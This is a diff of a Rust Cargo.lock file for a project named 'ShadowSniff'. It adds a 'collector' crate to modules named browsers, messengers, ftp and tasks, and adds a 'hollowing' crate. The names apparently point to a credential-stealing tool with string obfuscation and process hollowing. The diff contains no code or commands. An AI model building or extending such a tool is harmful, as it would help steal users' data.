@@ -6,6 +6,7 @@ version = 4
 name = "ShadowSniff"
 version = "0.1.0"
 dependencies = [
+ "collector",
  "ipinfo",
  "shadowsniff",
  "tasks",
@@ -24,6 +25,7 @@ checksum = "512761e0bb2578dd7380c6baaa0f4ce03e84f95e960231d1dec8bf4d7d6e2627"
 name = "browsers"
 version = "0.1.0"
 dependencies = [
+ "collector",
  "database",
  "json",
  "obfstr",
@@ -47,6 +49,14 @@ source = "registry+https://github.com/rust-lang/crates.io-index"
 checksum = "4785bdd1c96b2a846b2bd7cc02e86b6b3dbf14e7e53446c4f54c92a361040822"
 
 [[package]]
+name = "collector"
+version = "0.1.0"
+dependencies = [
+ "indoc",
+ "paste",
+]
+
+[[package]]
 name = "country-emoji"
 version = "0.1.0"
 
@@ -63,11 +73,26 @@ dependencies = [
 name = "ftp"
 version = "0.1.0"
 dependencies = [
+ "collector",
  "obfstr",
  "tasks",
  "utils",
  "windows",
 ]
+
+[[package]]
+name = "hollowing"
+version = "0.1.0"
+dependencies = [
+ "utils",
+ "windows-sys",
+]
+
+[[package]]
+name = "indoc"
+version = "2.0.6"
+source = "registry+https://github.com/rust-lang/crates.io-index"
+checksum = "f4c7245a08504955605670dbf141fceab975f15ca21570696aebe9d2e71576bd"
 
 [[package]]
 name = "ipinfo"
@@ -98,6 +123,7 @@ checksum = "8452105ba047068f40ff7093dd1d9da90898e63dd61736462e9cdda6a90ad3c3"
 name = "messengers"
 version = "0.1.0"
 dependencies = [
+ "collector",
  "obfstr",
  "requests",
  "tasks",
@@ -118,6 +144,12 @@ name = "obfstr"
 version = "0.4.4"
 source = "registry+https://github.com/rust-lang/crates.io-index"
 checksum = "d0d354e9a302760d07e025701d40534f17dd1fe4c4db955b4e3bd2907c63bdee"
+
+[[package]]
+name = "paste"
+version = "1.0.15"
+source = "registry+https://github.com/rust-lang/crates.io-index"
+checksum = "57c0d7b74b563b49d38dae00a0c37d4d6de9b432382b2892f0574ddcae73fd0a"
 
 [[package]]
 name = "proc-macro2"
@@ -151,6 +183,7 @@ name = "shadowsniff"
 version = "0.1.0"
 dependencies = [
  "browsers",
+ "collector",
  "ftp",
  "ipinfo",
  "messengers",
@@ -182,6 +215,7 @@ dependencies = [
 name = "tasks"
 version = "0.1.0"
 dependencies = [
+ "collector",
  "obfstr",
  "utils",
  "windows-sys",
